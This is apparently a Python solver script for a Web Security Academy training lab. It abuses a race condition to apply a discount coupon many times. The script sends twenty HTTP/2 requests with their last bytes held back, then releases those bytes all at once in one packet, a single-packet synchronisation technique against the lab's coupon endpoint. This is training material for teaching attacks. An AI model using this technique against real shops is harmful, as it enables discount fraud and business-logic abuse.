from web_security_academy.core.async_lab_session import AsyncLabSession
from web_security_academy.core.logger import logger

from urllib.parse import urljoin
from requests import Request

import socket
import h2.connection
import time


def solve_lab(session):
    session.login("wiener", "peter")
    data = {"productId": "1", "quantity": "1", "redir": "PRODUCT"}
    resp = session.post_path("/cart", data=data)
    logger.info('Add a "Lightweight l33t leather jacket" to cart.')

    csrf = session.get_csrf_token("/cart")
    data = {"csrf": csrf, "coupon": "PROMO20"}

    req = Request("POST", urljoin(session.url, "/cart/coupon"), data=data)
    prepped = session.prepare_request(req)

    # print(prepped.method)  # :method
    # print(prepped.url)  # :scheme, :path, :host
    # print(prepped.headers)
    # print(prepped.body)

    s = socket.create_connection(
        ("0aeb006503a5c5f082b5d08f00ce0011.web-security-academy.net", 80)
    )
    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 0)

    c = h2.connection.H2Connection()
    c.initiate_connection()
    s.sendall(c.data_to_send())

    headers = [
        (":method", prepped.method),
        (":path", "/cart/coupon"),
        (":authority", "0aeb006503a5c5f082b5d08f00ce0011.web-security-academy.net"),
        (":scheme", "http"),
    ] + list(prepped.headers.items())

    num_requests = 20
    stream_ids = []
    for i in range(num_requests):
        stream_ids.append(c.get_next_available_stream_id())
        c.send_headers(stream_ids[i], headers)
        c.send_data(stream_ids[i], prepped.body[:-1].encode())
        asdf = c.data_to_send()
        print(asdf)
        s.sendall(asdf)

    time.sleep(0.1)
    # c.send_headers(
    #     stream_ids[i],
    #     [
    #         (":method", "GET"),
    #         (":path", "/"),
    #         (
    #             ":authority",
    #             "0aeb006503a5c5f082b5d08f00ce0011.web-security-academy.net",
    #         ),
    #         (":scheme", "http"),
    #     ],
    # )
    # s.sendall(c.data_to_send())

    packet = b""
    for i in range(num_requests):
        c.send_data(stream_ids[i], prepped.body[-1].encode(), end_stream=True)
        asdf = c.data_to_send()
        print(asdf)
        packet += asdf
    s.sendall(packet)

    data = s.recv(65535)
    print(data)
    print(session.cookies.get_dict())
